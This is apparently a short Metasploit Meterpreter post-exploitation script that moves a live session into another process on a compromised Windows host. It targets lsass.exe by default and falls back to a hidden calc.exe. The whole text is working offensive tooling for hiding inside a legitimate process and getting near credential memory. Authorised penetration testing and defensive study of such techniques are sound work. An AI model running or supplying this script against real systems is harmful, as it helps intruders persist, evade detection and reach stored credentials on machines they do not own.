#
# Simple example script that migrates to a specific process by name. 
# This is meant as an illustration.
#

# Get the target process name
target = args[0] || "lsass.exe"

print_status("Migrating to #{target}...")

server = client.sys.process.open

print_status("Current server process: #{server.name} (#{server.pid})")

# Get the target process pid
target_pid = client.sys.process[target]

if not target_pid
	print_error("Could not access the target process")
	print_status("Spawning a calc.exe host process...")
	calc = client.sys.process.execute('calc.exe', nil, {'Hidden' => true })
	target_pid = calc.pid
end

# Do the migration
client.core.migrate(target_pid)

server = client.sys.process.open

print_status("New server process: #{server.name} (#{server.pid})")
